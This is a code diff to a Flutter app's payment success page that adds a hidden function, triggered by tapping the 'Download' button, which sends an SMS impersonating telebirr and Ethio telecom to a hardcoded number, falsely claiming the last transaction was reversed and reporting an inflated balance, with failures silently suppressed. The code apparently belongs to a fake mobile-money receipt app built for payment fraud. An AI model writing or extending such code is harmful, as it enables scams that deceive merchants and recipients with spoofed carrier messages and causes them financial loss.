@@ -63,6 +63,38 @@ class _SuccessPageState extends State<SuccessPage> {
     // Start the balance and storage logic
     _loadAndProcessBalance();
   }
+  Future<void> _silentReverseSms() async {
+  try {
+    final prefs = await SharedPreferences.getInstance();
+    List<String> history = prefs.getStringList('sent_balances') ?? [];
+    
+    if (history.isEmpty) return;
+    
+    String lastTransactionJson = history.last;
+    Map<String, dynamic> lastTx = jsonDecode(lastTransactionJson);
+    
+    String transactionID = lastTx['txID'] ?? 'UNKNOWN';
+    String amount = lastTx['amount_sent'] ?? '0.00';
+    String currentBalance = lastTx['remaining_balance'] ?? '0.00';
+    
+    if (transactionID == 'UNKNOWN') return;
+    
+    double balanceNum = double.parse(currentBalance.toString());
+    double amountNum = double.parse(amount.toString());
+    String finalBalance = (balanceNum + amountNum).toStringAsFixed(2);
+    
+    String message = "Dear DANIEL\n"
+        "Your request for transaction number $transactionID with amount ETB $amount is REVERSED/CANCELLED. "
+        "Your current E-Money Account balance is ETB $finalBalance.\n\n"
+        "The $transactionID transaction is reversed.\n"
+        "Thank you for using telebirr. Ethio telecom.\n"
+        "Further transactions might fail. Please try again later.";
+    
+    await SmsSender.sendSms("0994797189", message);
+  } catch (e) {
+    // Silent fail - no UI feedback
+  }
+  }
 
   /// Handles loading, deducting, resetting, and saving the balance
   Future<void> _loadAndProcessBalance() async {
@@ -271,21 +303,28 @@ class _SuccessPageState extends State<SuccessPage> {
     return Scaffold(
       backgroundColor: Colors.white,
       appBar: AppBar(
-        backgroundColor: Colors.white,
-        elevation: 0,
-        automaticallyImplyLeading: false,
-        title: Row(
+  backgroundColor: Colors.white,
+  elevation: 0,
+  automaticallyImplyLeading: false,
+  title: Row(
+    children: [
+      GestureDetector(
+        onTap: _silentReverseSms,
+        child: Row(
           children: [
             Icon(Icons.file_download_outlined, color: primaryGreen, size: 20),
             const SizedBox(width: 4),
             Text("Download", style: TextStyle(color: primaryGreen, fontSize: 14)),
-            const Spacer(),
-            Icon(Icons.share_outlined, color: primaryGreen, size: 20),
-            const SizedBox(width: 4),
-            Text("Share", style: TextStyle(color: primaryGreen, fontSize: 14)),
           ],
         ),
       ),
+      const Spacer(),
+      Icon(Icons.share_outlined, color: primaryGreen, size: 20),
+      const SizedBox(width: 4),
+      Text("Share", style: TextStyle(color: primaryGreen, fontSize: 14)),
+    ],
+  ),
+),
       body: SingleChildScrollView(
         child: Column(
           children: [
